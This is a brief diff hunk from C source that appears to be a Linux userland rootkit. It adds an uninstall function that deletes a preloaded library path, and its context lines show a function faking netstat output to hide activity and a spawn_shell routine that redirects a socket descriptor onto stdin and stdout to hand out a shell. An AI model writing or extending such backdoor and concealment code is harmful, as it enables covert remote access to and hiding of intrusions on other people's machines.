@@ -89,6 +89,10 @@ int fake_netstat(char *pathname, char *newfile){
     return 1;
 }
 
+void uninstall(){
+    unlink(MAGIC_LIBPATH);
+}
+
 void spawn_shell(int fd, char *cmd){
     dup2(fd, 0); //stdin
     dup2(fd, 1); //stdout
